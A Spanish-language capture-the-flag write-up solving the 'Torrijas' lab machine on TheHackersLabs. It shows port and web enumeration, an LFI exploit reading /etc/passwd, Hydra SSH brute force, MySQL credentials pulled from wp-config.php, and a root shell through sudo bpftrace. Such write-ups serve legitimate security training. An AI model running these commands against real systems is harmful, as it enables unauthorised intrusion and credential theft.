# 🧠 Resolución del CTF "Torrijas" | The HackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** Torrijas  
**Dificultad:** Media  
**Enfoque:** WordPress, LFI, MySQL, fuerza bruta SSH, escalada de privilegios vía `bpftrace`

---

## 🔍 1. Escaneo de puertos con Nmap

```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.168.1.118
```

**Puertos abiertos:**

- 22/tcp → OpenSSH 9.2p1
- 80/tcp → Apache 2.4.62
- 3306/tcp → MariaDB 10.11.6

---

## 🌐 2. Análisis web (HTTP)

Al abrir `http://192.168.1.118/`, encontramos una web estática de recetas (KINGRICE). No había funcionalidades sospechosas a simple vista.

---

## 🕵️ 3. Enumeración con Gobuster

```bash
gobuster dir -u http://192.168.1.118/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -x php
```

Se descubre `/wordpress/` y `/images/` (con indexación).

---

## 📝 4. Escaneo WordPress

Usamos `wpscan`:

- Usuario identificado: **administrator**
- Plugin vulnerable: `web-directory-free` (vulnerable a **LFI**)

---

## 💥 5. Explotación de LFI (CVE-2024-3673)

Se usa un exploit público para leer `/etc/passwd`:

```bash
python3 CVE-2024-3673.py --url http://192.168.1.118/wordpress --file ../../../../../../etc/passwd
```

Se identifican los usuarios `primo` y `premo`.

---

## 🔐 6. Fuerza bruta SSH con Hydra

```bash
hydra -l premo -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.118
```

**Credenciales válidas:**

- Usuario: `premo`
- Contraseña: `cassandra`

---

## 💻 7. Acceso SSH

```bash
ssh premo@192.168.1.118
```

Acceso exitoso a la máquina.

---

## 📂 8. Credenciales desde wp-config.php

Inspeccionamos el archivo:

```bash
cat /var/www/html/wordpress/wp-config.php
```

Obtenemos credenciales MySQL:
- Usuario: `admin`
- Contraseña: `afdvasgvfdsabdgvs6a9vD8sv`

---

## 🐬 9. Acceso a bases de datos MariaDB

```bash
mysql -u admin -p
```

Después:

```sql
mysql -u root -p
SHOW DATABASES;
USE Torrijas;
SELECT * FROM primo;
```

**Credenciales adicionales encontradas:**

- Usuario: `primo`
- Contraseña: `queazeshurmano`

---

## ⬆️ 10. Escalada de privilegios (bpftrace)

Verificamos privilegios sudo:

```bash
sudo -l
```

El usuario `primo` puede ejecutar `bpftrace` como root sin contraseña:

```bash
sudo bpftrace -c /bin/sh -e 'END {exit()}'
```

Y obtenemos **acceso como root**:

```bash
whoami
> root
```

---

## 🏁 Conclusión

Se obtiene acceso root mediante:

1. Enumeración de WordPress y explotación de LFI.
2. Descubrimiento de usuarios desde `/etc/passwd`.
3. Ataque de fuerza bruta SSH.
4. Análisis de configuración para acceder a MySQL.
5. Escalada de privilegios con `bpftrace`.
